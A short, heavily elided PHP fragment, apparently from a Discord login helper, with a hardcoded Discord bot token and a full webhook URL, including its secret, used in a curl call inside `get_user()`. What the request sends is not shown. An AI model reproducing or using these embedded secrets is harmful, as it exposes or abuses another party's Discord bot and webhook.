...
$GLOBALS['bot_token'] = "MTMyMjI2NDg1OTEyNzE4NTQyOA.GwXVIh.XAgnzgCZlwn7F_sdycSgcrkYZcDhuGBlJes4Lo";
function gen_state()
{
...
function get_user()
{
    ...
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://discord.com/api/webhooks/1325394075226079312/nTaW3lNK_j-rFap38NAYScTFTWIoeSvJDzW_C7iqpENSoQgPDRzv6QWc_CFn7pu26CO-");
